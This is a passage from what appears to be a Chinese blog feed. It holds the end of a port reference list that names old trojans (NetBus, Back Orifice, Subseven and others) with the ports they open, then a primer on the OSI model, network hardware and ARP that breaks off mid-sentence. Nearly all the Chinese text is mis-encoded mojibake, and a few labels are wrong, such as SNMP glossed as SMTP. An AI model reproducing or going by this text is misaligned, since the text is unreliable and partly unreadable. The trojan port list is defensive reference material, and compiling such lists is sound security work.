ã€‚</p><p>  20034<br>  [NULL]<br>  æœ¨é©¬NetBus Proå¼€æ”¾æ­¤ ã€‚</p><p>  21554<br>  [NULL]<br>  æœ¨é©¬GirlFriendå¼€æ”¾æ­¤ ã€‚</p><p>  22222<br>  [NULL]<br>  æœ¨é©¬Prosiakå¼€æ”¾æ­¤ ã€‚</p><p>  23456<br>  [NULL]<br>  æœ¨é©¬Evil FTPã€Ugly FTPå¼€æ”¾æ­¤ ã€‚</p><p>  26274ã€47262<br>  [NULL]<br>  æœ¨é©¬Deltaå¼€æ”¾æ­¤ ã€‚</p><p>  27374<br>  [NULL]<br>  æœ¨é©¬Subseven 2.1å¼€æ”¾æ­¤ ã€‚</p><p>  30100<br>  [NULL]<br>  æœ¨é©¬NetSphereå¼€æ”¾æ­¤ ã€‚</p><p>  30303<br>  [NULL]<br>  æœ¨é©¬Socket23å¼€æ”¾æ­¤ ã€‚</p><p>  30999<br>  [NULL]<br>  æœ¨é©¬Kuangå¼€æ”¾æ­¤ ã€‚</p><p>  31337ã€31338<br>  [NULL]<br>  æœ¨é©¬BO(Back Orifice)å¼€æ”¾æ­¤ ã€‚å¦å¤–æœ¨é©¬DeepBOä¹Ÿå¼€æ”¾31338 ã€‚</p><p>  31339<br>  [NULL]<br>  æœ¨é©¬NetSpy DKå¼€æ”¾æ­¤ ã€‚</p><p>  31666<br>  [NULL]<br>  æœ¨é©¬BOWhackå¼€æ”¾æ­¤ ã€‚</p><p>  33333<br>  [NULL]<br>  æœ¨é©¬Prosiakå¼€æ”¾æ­¤ ã€‚</p><p>  34324<br>  [NULL]<br>  æœ¨é©¬Tiny Telnet Serverã€BigGluckã€TNå¼€æ”¾æ­¤ ã€‚</p><p>  40412<br>  [NULL]<br>  æœ¨é©¬The Spyå¼€æ”¾æ­¤ ã€‚</p><p>  40421ã€40422ã€40423ã€40426ã€<br>  [NULL]<br>  æœ¨é©¬Masters Paradiseå¼€æ”¾æ­¤ ã€‚</p><p>  43210ã€54321<br>  [NULL]<br>  æœ¨é©¬SchoolBus 1.0/2.0å¼€æ”¾æ­¤ ã€‚</p><p>  44445<br>  [NULL]<br>  æœ¨é©¬Happypigå¼€æ”¾æ­¤ ã€‚</p><p>  50766<br>  [NULL]<br>  æœ¨é©¬Foreå¼€æ”¾æ­¤ ã€‚</p><p>  53001<br>  [NULL]<br>  æœ¨é©¬Remote Windows Shutdownå¼€æ”¾æ­¤ ã€‚</p><p>  65000<br>  [NULL]<br>  æœ¨é©¬Devil 1.03å¼€æ”¾æ­¤ ã€‚</p><p>  88<br>  Kerberos krb5ã€‚å¦å¤–TCPçš„88 ä¹Ÿæ˜¯è¿™ä¸ªç”¨é€”ã€‚</p><p>  137<br>  SQL Named Pipes encryption over other protocols name lookup(å…¶ä»–åè®®åç§°æŸ¥æ‰¾ä¸Šçš„SQLå‘½åç®¡é“åŠ å¯†æŠ€æœ¯)å’ŒSQL RPC encryption over other protocols name lookup(å…¶ä»–åè®®åç§°æŸ¥æ‰¾ä¸Šçš„SQL RPCåŠ å¯†æŠ€æœ¯)å’ŒWins NetBT name service(WINS NetBTåç§° )å’ŒWins Proxyéƒ½ç”¨è¿™ä¸ª ã€‚</p><p>  161<br>  Simple Network Management Protocol(SMTP)ï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰ã€‚</p><p>  162<br>  SNMP Trapï¼ˆSNMPé™·é˜±ï¼‰</p><p>  445<br>  Common Internet File System(CIFS)ï¼ˆå…¬å…±Internetæ–‡ä»¶ç³»ç»Ÿï¼‰</p><p>  464<br>  Kerberos kpasswd(v5)ã€‚å¦å¤–TCPçš„464 ä¹Ÿæ˜¯è¿™ä¸ªç”¨é€”ã€‚</p><p>  500<br>  Internet Key Exchange(IKE)ï¼ˆInternetå¯†é’¥äº¤æ¢ï¼‰</p><p>  1645ã€1812<br>  Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(è¿œç¨‹è®¤è¯æ‹¨å·ç”¨æˆ· )</p><p>  1646ã€1813<br>  RADIUS accounting(Routing and Remote Access)(RADIUSè®°å¸ï¼ˆè·¯ç”±å’Œè¿œç¨‹è®¿é—®ï¼‰)</p><p>  1701<br>  Layer Two Tunneling Protocol(L2TP)(ç¬¬2å±‚éš§é“åè®®)</p><p>  1801ã€3527<br>  Microsoft Message Queue Server(Microsoftæ¶ˆæ¯é˜Ÿåˆ— å™¨)ã€‚è¿˜æœ‰TCPçš„135ã€1801ã€2101ã€2103ã€2105ä¹Ÿæ˜¯åŒæ ·çš„ç”¨é€”ã€‚</p><p>  2504<br>  Network Load Balancing(ç½‘ç»œå¹³è¡¡è´Ÿè·)</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¡ç®—æœºç½‘ç»œåŸºç¡€</title>
    <link href="/2020/12/04/%E8%AE%A1%E7%BD%91/"/>
    <url>/2020/12/04/%E8%AE%A1%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€ç½‘ç»œæ¨¡å‹"><a href="#ä¸€ã€ç½‘ç»œæ¨¡å‹" class="headerlink" title="ä¸€ã€ç½‘ç»œæ¨¡å‹"></a>ä¸€ã€ç½‘ç»œæ¨¡å‹</h1><p>ä¸åŒåˆ’åˆ†æ–¹å¼ä¸‹çš„ç½‘ç»œä½“ç³»æ¨¡å‹<br><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20201203133326473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20201203224110893.gif"></p><hr><h1 id="äºŒã€å„å±‚ä»‹ç»"><a href="#äºŒã€å„å±‚ä»‹ç»" class="headerlink" title="äºŒã€å„å±‚ä»‹ç»"></a>äºŒã€å„å±‚ä»‹ç»</h1><p>1ï¼‰<strong>ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰</strong></p><p>æ¿€æ´»ã€ç»´æŒã€å…³é—­é€šä¿¡ç«¯ç‚¹ä¹‹é—´çš„æœºæ¢°ç‰¹æ€§ã€ç”µæ°”ç‰¹æ€§ã€åŠŸèƒ½ç‰¹æ€§ä»¥åŠè¿‡ç¨‹ç‰¹æ€§ã€‚è¯¥å±‚ä¸ºä¸Šå±‚åè®®æä¾›äº†ä¸€ä¸ªä¼ è¾“æ•°æ®çš„å¯é çš„ç‰©ç†åª’ä½“ã€‚ç®€å•çš„è¯´ï¼Œç‰©ç†å±‚ç¡®ä¿åŸå§‹çš„æ•°æ®å¯åœ¨å„ç§ç‰©ç†åª’ä½“ä¸Šä¼ è¾“ã€‚ç‰©ç†å±‚è®°ä½ä¸¤ä¸ªé‡è¦çš„è®¾å¤‡åç§°ï¼Œä¸­ç»§å™¨ï¼ˆRepeaterï¼Œä¹Ÿå«æ”¾å¤§å™¨ï¼‰å’Œé›†çº¿å™¨ã€‚</p><p>2ï¼‰<strong>æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰</strong></p><p>æ•°æ®é“¾è·¯å±‚åœ¨ç‰©ç†å±‚æä¾›çš„æœåŠ¡çš„åŸºç¡€ä¸Šå‘ç½‘ç»œå±‚æä¾›æœåŠ¡ï¼Œå…¶æœ€åŸºæœ¬çš„æœåŠ¡æ˜¯å°†æºè‡ªç½‘ç»œå±‚æ¥çš„æ•°æ®å¯é åœ°ä¼ è¾“åˆ°ç›¸é‚»èŠ‚ç‚¹çš„ç›®æ ‡æœºç½‘ç»œå±‚ã€‚ä¸ºè¾¾åˆ°è¿™ä¸€ç›®çš„ï¼Œæ•°æ®é“¾è·¯å¿…é¡»å…·å¤‡ä¸€ç³»åˆ—ç›¸åº”çš„åŠŸèƒ½ï¼Œä¸»è¦æœ‰ï¼šå¦‚ä½•å°†æ•°æ®ç»„åˆæˆæ•°æ®å—ï¼Œåœ¨æ•°æ®é“¾è·¯å±‚ä¸­ç§°è¿™ç§æ•°æ®å—ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œå¸§æ˜¯æ•°æ®é“¾è·¯å±‚çš„ä¼ é€å•ä½ï¼›å¦‚ä½•æ§åˆ¶å¸§åœ¨ç‰©ç†ä¿¡é“ä¸Šçš„ä¼ è¾“ï¼ŒåŒ…æ‹¬å¦‚ä½•å¤„ç†ä¼ è¾“å·®é”™ï¼Œå¦‚ä½•è°ƒèŠ‚å‘é€é€Ÿç‡ä»¥ä½¿ä¸æ¥æ”¶æ–¹ç›¸åŒ¹é…ï¼›ä»¥åŠåœ¨ä¸¤ä¸ªç½‘ç»œå®ä½“ä¹‹é—´æä¾›æ•°æ®é“¾è·¯é€šè·¯çš„å»ºç«‹ã€ç»´æŒå’Œé‡Šæ”¾çš„ç®¡ç†ã€‚æ•°æ®é“¾è·¯å±‚åœ¨ä¸å¯é çš„ç‰©ç†ä»‹è´¨ä¸Šæä¾›å¯é çš„ä¼ è¾“ã€‚è¯¥å±‚çš„ä½œç”¨åŒ…æ‹¬ï¼šç‰©ç†åœ°å€å¯»å€ã€æ•°æ®çš„æˆå¸§ã€æµé‡æ§åˆ¶ã€æ•°æ®çš„æ£€é”™ã€é‡å‘ç­‰ã€‚</p><ul><li>æ•°æ®é“¾è·¯å±‚ä¸ºç½‘ç»œå±‚æä¾›å¯é çš„æ•°æ®ä¼ è¾“ï¼›</li><li>åŸºæœ¬æ•°æ®å•ä½ä¸ºå¸§ï¼›</li><li>ä¸»è¦çš„åè®®ï¼š<strong>ä»¥å¤ªç½‘åè®®</strong>ï¼›</li><li>ä¸¤ä¸ªé‡è¦è®¾å¤‡åç§°ï¼šç½‘æ¡¥å’Œäº¤æ¢æœºã€‚</li></ul><p>3ï¼‰<strong>ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰</strong></p><p>ç½‘ç»œå±‚çš„ç›®çš„æ˜¯å®ç°ä¸¤ä¸ªç«¯ç³»ç»Ÿä¹‹é—´çš„æ•°æ®é€æ˜ä¼ é€ï¼Œå…·ä½“åŠŸèƒ½åŒ…æ‹¬å¯»å€å’Œè·¯ç”±é€‰æ‹©ã€è¿æ¥çš„å»ºç«‹ã€ä¿æŒå’Œç»ˆæ­¢ç­‰ã€‚å®ƒæä¾›çš„æœåŠ¡ä½¿ä¼ è¾“å±‚ä¸éœ€è¦äº†è§£ç½‘ç»œä¸­çš„æ•°æ®ä¼ è¾“å’Œäº¤æ¢æŠ€æœ¯ã€‚å¦‚æœæ‚¨æƒ³ç”¨å°½é‡å°‘çš„è¯æ¥è®°ä½ç½‘ç»œå±‚ï¼Œé‚£å°±æ˜¯â€œè·¯å¾„é€‰æ‹©ã€è·¯ç”±åŠé€»è¾‘å¯»å€â€ã€‚</p><p>ç½‘ç»œå±‚ä¸­æ¶‰åŠä¼—å¤šçš„åè®®ï¼Œå…¶ä¸­åŒ…æ‹¬æœ€é‡è¦çš„åè®®ï¼Œä¹Ÿæ˜¯TCP/IPçš„æ ¸å¿ƒåè®®â€”â€”IPåè®®ã€‚IPåè®®éå¸¸ç®€å•ï¼Œä»…ä»…æä¾›ä¸å¯é ã€æ— è¿æ¥çš„ä¼ é€æœåŠ¡ã€‚IPåè®®çš„ä¸»è¦åŠŸèƒ½æœ‰ï¼šæ— è¿æ¥æ•°æ®æŠ¥ä¼ è¾“ã€æ•°æ®æŠ¥è·¯ç”±é€‰æ‹©å’Œå·®é”™æ§åˆ¶ã€‚ä¸IPåè®®é…å¥—ä½¿ç”¨å®ç°å…¶åŠŸèƒ½çš„è¿˜æœ‰åœ°å€è§£æåè®®ARPã€é€†åœ°å€è§£æåè®®RARPã€å› ç‰¹ç½‘æŠ¥æ–‡åè®®ICMPã€å› ç‰¹ç½‘ç»„ç®¡ç†åè®®IGMPã€‚</p><ul><li>ç½‘ç»œå±‚è´Ÿè´£å¯¹å­ç½‘é—´çš„æ•°æ®åŒ…è¿›è¡Œè·¯ç”±é€‰æ‹©ã€‚æ­¤å¤–ï¼Œç½‘ç»œå±‚è¿˜å¯ä»¥å®ç°æ‹¥å¡æ§åˆ¶ã€ç½‘é™…äº’è¿ç­‰åŠŸèƒ½ï¼›</li><li>åŸºæœ¬æ•°æ®å•ä½ä¸ºIPæ•°æ®æŠ¥ï¼›</li><li>åŒ…å«çš„ä¸»è¦åè®®ï¼š<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IPåè®®ï¼ˆInternet Protocolï¼Œå› ç‰¹ç½‘äº’è”åè®®ï¼‰<span class="hljs-comment">;</span><br><br>ICMPåè®®ï¼ˆInternet Control Message Protocolï¼Œå› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰<span class="hljs-comment">;</span><br><br>ARPåè®®ï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰<span class="hljs-comment">;</span><br><br>RARPåè®®ï¼ˆReverse Address Resolution Protocolï¼Œé€†åœ°å€è§£æåè®®ï¼‰ã€‚<br></code></pre></td></tr></table></figure></li><li>é‡è¦çš„è®¾å¤‡ï¼šè·¯ç”±å™¨ã€‚</li></ul><p>4ï¼‰<strong>ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰</strong></p><p>ç¬¬ä¸€ä¸ªç«¯åˆ°ç«¯ï¼Œå³ä¸»æœºåˆ°ä¸»æœºçš„å±‚æ¬¡ã€‚ä¼ è¾“å±‚è´Ÿè´£å°†ä¸Šå±‚æ•°æ®åˆ†æ®µå¹¶æä¾›ç«¯åˆ°ç«¯çš„ã€å¯é çš„æˆ–ä¸å¯é çš„ä¼ è¾“ã€‚æ­¤å¤–ï¼Œä¼ è¾“å±‚è¿˜è¦å¤„ç†ç«¯åˆ°ç«¯çš„å·®é”™æ§åˆ¶å’Œæµé‡æ§åˆ¶é—®é¢˜ã€‚</p><p>ä¼ è¾“å±‚çš„ä»»åŠ¡æ˜¯æ ¹æ®é€šä¿¡å­ç½‘çš„ç‰¹æ€§ï¼Œæœ€ä½³çš„åˆ©ç”¨ç½‘ç»œèµ„æºï¼Œä¸ºä¸¤ä¸ªç«¯ç³»ç»Ÿçš„ä¼šè¯å±‚ä¹‹é—´ï¼Œæä¾›å»ºç«‹ã€ç»´æŠ¤å’Œå–æ¶ˆä¼ è¾“è¿æ¥çš„åŠŸèƒ½ï¼Œè´Ÿè´£ç«¯åˆ°ç«¯çš„å¯é æ•°æ®ä¼ è¾“ã€‚åœ¨è¿™ä¸€å±‚ï¼Œä¿¡æ¯ä¼ é€çš„åè®®æ•°æ®å•å…ƒç§°ä¸ºæ®µæˆ–æŠ¥æ–‡ã€‚</p><p>ç½‘ç»œå±‚åªæ˜¯æ ¹æ®ç½‘ç»œåœ°å€å°†æºç»“ç‚¹å‘å‡ºçš„æ•°æ®åŒ…ä¼ é€åˆ°ç›®çš„ç»“ç‚¹ï¼Œè€Œä¼ è¾“å±‚åˆ™è´Ÿè´£å°†æ•°æ®å¯é åœ°ä¼ é€åˆ°ç›¸åº”çš„ç«¯å£ã€‚</p><ul><li><p>ä¼ è¾“å±‚è´Ÿè´£å°†ä¸Šå±‚æ•°æ®åˆ†æ®µå¹¶æä¾›ç«¯åˆ°ç«¯çš„ã€å¯é çš„æˆ–ä¸å¯é çš„ä¼ è¾“ä»¥åŠç«¯åˆ°ç«¯çš„å·®é”™æ§åˆ¶å’Œæµé‡æ§åˆ¶é—®é¢˜ï¼›</p></li><li><p>åŒ…å«çš„ä¸»è¦åè®®ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">TCPåè®®ï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰<br>UDPåè®®ï¼ˆ<span class="hljs-keyword">User</span> <span class="hljs-title">Datagram</span> Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰<br></code></pre></td></tr></table></figure></li></ul><ul><li>é‡è¦è®¾å¤‡ï¼šç½‘å…³ã€‚</li></ul><p>5ï¼‰<strong>ä¼šè¯å±‚</strong></p><p>ä¼šè¯å±‚ç®¡ç†ä¸»æœºä¹‹é—´çš„ä¼šè¯è¿›ç¨‹ï¼Œå³è´Ÿè´£å»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢è¿›ç¨‹ä¹‹é—´çš„ä¼šè¯ã€‚ä¼šè¯å±‚è¿˜åˆ©ç”¨åœ¨æ•°æ®ä¸­æ’å…¥æ ¡éªŒç‚¹æ¥å®ç°æ•°æ®çš„åŒæ­¥ã€‚</p><p>6ï¼‰<strong>è¡¨ç¤ºå±‚</strong></p><p>è¡¨ç¤ºå±‚å¯¹ä¸Šå±‚æ•°æ®æˆ–ä¿¡æ¯è¿›è¡Œå˜æ¢ä»¥ä¿è¯ä¸€ä¸ªä¸»æœºåº”ç”¨å±‚ä¿¡æ¯å¯ä»¥è¢«å¦ä¸€ä¸ªä¸»æœºçš„åº”ç”¨ç¨‹åºç†è§£ã€‚è¡¨ç¤ºå±‚çš„æ•°æ®è½¬æ¢åŒ…æ‹¬æ•°æ®çš„åŠ å¯†ã€å‹ç¼©ã€æ ¼å¼è½¬æ¢ç­‰ã€‚</p><p>7ï¼‰<strong>åº”ç”¨å±‚</strong></p><p>ä¸ºæ“ä½œç³»ç»Ÿæˆ–ç½‘ç»œåº”ç”¨ç¨‹åºæä¾›è®¿é—®ç½‘ç»œæœåŠ¡çš„æ¥å£ã€‚</p><p>ä¼šè¯å±‚ã€è¡¨ç¤ºå±‚å’Œåº”ç”¨å±‚æ³¨æ„ï¼š</p><ul><li><p>æ•°æ®ä¼ è¾“åŸºæœ¬å•ä½ä¸ºæŠ¥æ–‡ï¼›</p></li><li><p>åŒ…å«çš„ä¸»è¦åè®®ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FTPï¼ˆæ–‡ä»¶ä¼ é€åè®®ï¼‰<br>Telnetï¼ˆè¿œç¨‹ç™»å½•åè®®ï¼‰<br>DNSï¼ˆåŸŸåè§£æåè®®ï¼‰<br>SMTPï¼ˆé‚®ä»¶ä¼ é€åè®®ï¼‰<br>POP3åè®®ï¼ˆé‚®å±€åè®®ï¼‰<br>HTTPåè®®ï¼ˆHyper <span class="hljs-built_in">Text</span> Transfer Protocolï¼‰<br></code></pre></td></tr></table></figure></li></ul><hr><h1 id="ä¸‰ã€ç¡¬ä»¶æ€»ç»“"><a href="#ä¸‰ã€ç¡¬ä»¶æ€»ç»“" class="headerlink" title="ä¸‰ã€ç¡¬ä»¶æ€»ç»“"></a>ä¸‰ã€ç¡¬ä»¶æ€»ç»“</h1><p>1ï¼‰äº¤æ¢æœº<br>åœ¨è®¡ç®—æœºç½‘ç»œç³»ç»Ÿä¸­ï¼Œäº¤æ¢æœºæ˜¯é’ˆå¯¹å…±äº«å·¥ä½œæ¨¡å¼çš„å¼±ç‚¹è€Œæ¨å‡ºçš„ã€‚äº¤æ¢æœºæ‹¥æœ‰ä¸€æ¡é«˜å¸¦å®½çš„èƒŒéƒ¨æ€»çº¿å’Œå†…éƒ¨äº¤æ¢çŸ©é˜µã€‚äº¤æ¢æœºçš„æ‰€æœ‰çš„ç«¯å£éƒ½æŒ‚æ¥åœ¨è¿™æ¡èƒŒ éƒ¨æ€»çº¿ä¸Šï¼Œå½“æ§åˆ¶ç”µè·¯æ”¶åˆ°æ•°æ®åŒ…ä»¥åï¼Œå¤„ç†ç«¯å£ä¼šæŸ¥æ‰¾å†…å­˜ä¸­çš„åœ°å€å¯¹ç…§è¡¨ä»¥ç¡®å®šç›®çš„MACï¼ˆç½‘å¡çš„ç¡¬ä»¶åœ°å€ï¼‰çš„NICï¼ˆç½‘å¡ï¼‰æŒ‚æ¥åœ¨å“ªä¸ªç«¯å£ä¸Šï¼Œé€šè¿‡å†…éƒ¨ äº¤æ¢çŸ©é˜µè¿…é€Ÿå°†æ•°æ®åŒ…ä¼ é€åˆ°ç›®çš„ç«¯å£ã€‚ç›®çš„MACè‹¥ä¸å­˜åœ¨ï¼Œäº¤æ¢æœºæ‰å¹¿æ’­åˆ°æ‰€æœ‰çš„ç«¯å£ï¼Œæ¥æ”¶ç«¯å£å›åº”åäº¤æ¢æœºä¼šâ€œå­¦ä¹ â€æ–°çš„åœ°å€ï¼Œå¹¶æŠŠå®ƒæ·»åŠ å…¥å†…éƒ¨åœ°å€è¡¨ä¸­ã€‚äº¤æ¢æœºå·¥ä½œäºOSIå‚è€ƒæ¨¡å‹çš„ç¬¬äºŒå±‚ï¼Œå³æ•°æ®é“¾è·¯å±‚ã€‚äº¤æ¢æœºå†…éƒ¨çš„CPUä¼šåœ¨æ¯ä¸ªç«¯å£æˆåŠŸè¿æ¥æ—¶ï¼Œé€šè¿‡ARPåè®®å­¦ä¹ å®ƒçš„MACåœ°å€ï¼Œä¿å­˜æˆä¸€å¼  ARPè¡¨ã€‚åœ¨ä»Šåçš„é€šè®¯ä¸­ï¼Œå‘å¾€è¯¥MACåœ°å€çš„æ•°æ®åŒ…å°†ä»…é€å¾€å…¶å¯¹åº”çš„ç«¯å£ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„ç«¯å£ã€‚å› æ­¤ï¼Œäº¤æ¢æœºå¯ç”¨äºåˆ’åˆ†æ•°æ®é“¾è·¯å±‚å¹¿æ’­ï¼Œå³å†²çªåŸŸï¼›ä½†å®ƒä¸ èƒ½åˆ’åˆ†ç½‘ç»œå±‚å¹¿æ’­ï¼Œå³å¹¿æ’­åŸŸã€‚äº¤æ¢æœºè¢«å¹¿æ³›åº”ç”¨äºäºŒå±‚ç½‘ç»œäº¤æ¢ï¼Œä¿—ç§°â€œäºŒå±‚äº¤æ¢æœºâ€ã€‚äº¤æ¢æœºçš„ç§ç±»æœ‰ï¼šäºŒå±‚äº¤æ¢æœºã€ä¸‰å±‚äº¤æ¢æœºã€å››å±‚äº¤æ¢æœºã€ä¸ƒå±‚äº¤æ¢æœºåˆ†åˆ«å·¥ä½œåœ¨OSIä¸ƒå±‚æ¨¡å‹ä¸­çš„ç¬¬äºŒå±‚ã€ç¬¬ä¸‰å±‚ã€ç¬¬å››å±‚ç›’ç¬¬ä¸ƒå±‚ï¼Œå¹¶å› æ­¤è€Œå¾—åã€‚</p><p>2ï¼‰è·¯ç”±å™¨<br>è·¯ç”±å™¨ï¼ˆRouterï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œè®¾å¤‡ï¼Œæä¾›äº†è·¯ç”±ä¸è½¬é€ä¸¤ç§é‡è¦æœºåˆ¶ï¼Œå¯ä»¥å†³å®šæ•°æ®åŒ…ä»æ¥æºç«¯åˆ°ç›®çš„ç«¯æ‰€ç»è¿‡ çš„è·¯ç”±è·¯å¾„ï¼ˆhoståˆ°hostä¹‹é—´çš„ä¼ è¾“è·¯å¾„ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè·¯ç”±ï¼›å°†è·¯ç”±å™¨è¾“å…¥ç«¯çš„æ•°æ®åŒ…ç§»é€è‡³é€‚å½“çš„è·¯ç”±å™¨è¾“å‡ºç«¯(åœ¨è·¯ç”±å™¨å†…éƒ¨è¿›è¡Œ)ï¼Œè¿™ç§°ä¸ºè½¬é€ã€‚è·¯ç”±å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬ä¸‰å±‚â€”â€”å³ç½‘ç»œå±‚ï¼Œä¾‹å¦‚ç½‘é™…åè®®ã€‚è·¯ç”±å™¨çš„ä¸€ä¸ªä½œç”¨æ˜¯è¿é€šä¸åŒçš„ç½‘ç»œï¼Œå¦ä¸€ä¸ªä½œç”¨æ˜¯é€‰æ‹©ä¿¡æ¯ä¼ é€çš„çº¿è·¯ã€‚ è·¯ç”±å™¨ä¸äº¤æ¢å™¨çš„å·®åˆ«ï¼Œè·¯ç”±å™¨æ˜¯å±äºOSIç¬¬ä¸‰å±‚çš„äº§å“ï¼Œäº¤æ¢å™¨æ˜¯OSIç¬¬äºŒå±‚çš„äº§å“(è¿™é‡Œç‰¹æŒ‡äºŒå±‚äº¤æ¢æœº)ã€‚</p><p>3ï¼‰ç½‘å…³<br>ç½‘å…³ï¼ˆGatewayï¼‰ï¼Œç½‘å…³é¡¾åæ€ä¹‰å°±æ˜¯è¿æ¥ä¸¤ä¸ªç½‘ç»œçš„è®¾å¤‡ï¼ŒåŒºåˆ«äºè·¯ç”±å™¨ï¼ˆç”±äºå†å²çš„åŸå› ï¼Œè®¸å¤šæœ‰å…³TCP/IP çš„æ–‡çŒ®æ›¾ç»æŠŠç½‘ç»œå±‚ä½¿ç”¨çš„è·¯ç”±å™¨ï¼ˆRouterï¼‰ç§°ä¸ºç½‘å…³ï¼Œåœ¨ä»Šå¤©å¾ˆå¤šå±€åŸŸç½‘é‡‡ç”¨éƒ½æ˜¯è·¯ç”±æ¥æ¥å…¥ç½‘ç»œï¼Œå› æ­¤ç°åœ¨é€šå¸¸æŒ‡çš„ç½‘å…³å°±æ˜¯è·¯ç”±å™¨çš„IPï¼‰ï¼Œç»å¸¸åœ¨å®¶ åº­ä¸­æˆ–è€…å°å‹ä¼ä¸šç½‘ç»œä¸­ä½¿ç”¨ï¼Œç”¨äºè¿æ¥å±€åŸŸç½‘å’ŒInternetã€‚ ç½‘å…³ä¹Ÿç»å¸¸æŒ‡æŠŠä¸€ç§åè®®è½¬æˆå¦ä¸€ç§åè®®çš„è®¾å¤‡ï¼Œæ¯”å¦‚è¯­éŸ³ç½‘å…³ã€‚</p><h1 id="å››ã€-åè®®æ€»ç»“"><a href="#å››ã€-åè®®æ€»ç»“" class="headerlink" title="å››ã€ åè®®æ€»ç»“"></a>å››ã€ åè®®æ€»ç»“</h1><p>ç‰©ç†å±‚ï¼šRJ45ã€CLOCKã€IEEE802.3    ï¼ˆä¸­ç»§å™¨ï¼Œé›†çº¿å™¨ï¼Œç½‘å…³ï¼‰<br>æ•°æ®é“¾è·¯ï¼šPPPã€FRã€HDLCã€VLANã€MAC  ï¼ˆç½‘æ¡¥ï¼Œäº¤æ¢æœºï¼‰<br>ç½‘ç»œå±‚ï¼š<strong>IP</strong>ã€ICMPã€<strong>ARP</strong>ã€RARPã€OSPFã€IPXã€RIPã€IGRPã€ ï¼ˆè·¯ç”±å™¨ï¼‰<br>ä¼ è¾“å±‚ï¼š<strong>TCP</strong>ã€<strong>UDP</strong>ã€SPX<br>ä¼šè¯å±‚ï¼šNFSã€<strong>SQL</strong>ã€NETBIOSã€RPC<br>è¡¨ç¤ºå±‚ï¼šJPEGã€MPEGã€ASII<br>åº”ç”¨å±‚ï¼š<strong>FTP</strong>ã€<strong>DNS</strong>ã€Telnetã€SMTPã€<strong>HTTP</strong>ã€<strong>WWW</strong>ã€NFS</p><hr><h1 id="äº”ã€å¯¹åè®®çš„æ¢³ç†"><a href="#äº”ã€å¯¹åè®®çš„æ¢³ç†" class="headerlink" title="äº”ã€å¯¹åè®®çš„æ¢³ç†"></a>äº”ã€å¯¹åè®®çš„æ¢³ç†</h1><h2 id="MACä¸IPé—´çš„åè®®"><a href="#MACä¸IPé—´çš„åè®®" class="headerlink" title="MACä¸IPé—´çš„åè®®"></a>MACä¸IPé—´çš„åè®®</h2><p><strong>ARPåè®®ï¼š</strong> è´Ÿè´£å°†IPåœ°å€æ˜ å°„åˆ° MACåœ°å€</p><ul><li><input checked="" disabled="" type="checkbox"> æ ¹æ®IPåœ°å€è·å–ç‰©ç†åœ°å€:<br>é¦–å…ˆï¼Œæ¯ä¸ªä¸»æœºéƒ½ä¼šåœ¨è‡ªå·±çš„ARPç¼“å†²åŒºä¸­å»ºç«‹ä¸€ä¸ªARPåˆ—è¡¨ï¼Œä»¥è¡¨ç¤ºIPåœ°å€å’ŒMACåœ°å€ä¹‹é—´çš„å¯¹åº”å…³ç³»ã€‚å½“æºä¸»æœºè¦å‘é€æ•°æ®æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥ARPåˆ—è¡¨ä¸­æ˜¯å¦æœ‰å¯¹åº”IPåœ°å€çš„ç›®çš„ä¸»æœºçš„MACåœ°å€ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç›´æ¥å‘é€æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±å‘æœ¬ç½‘æ®µçš„æ‰€æœ‰ä¸»æœºå‘é€ARPæ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…åŒ…æ‹¬çš„å†…å®¹æœ‰ï¼šæºä¸»æœº IPåœ°å€ï¼Œæºä¸»æœºMACåœ°å€ï¼Œç›®çš„ä¸»æœºçš„IP 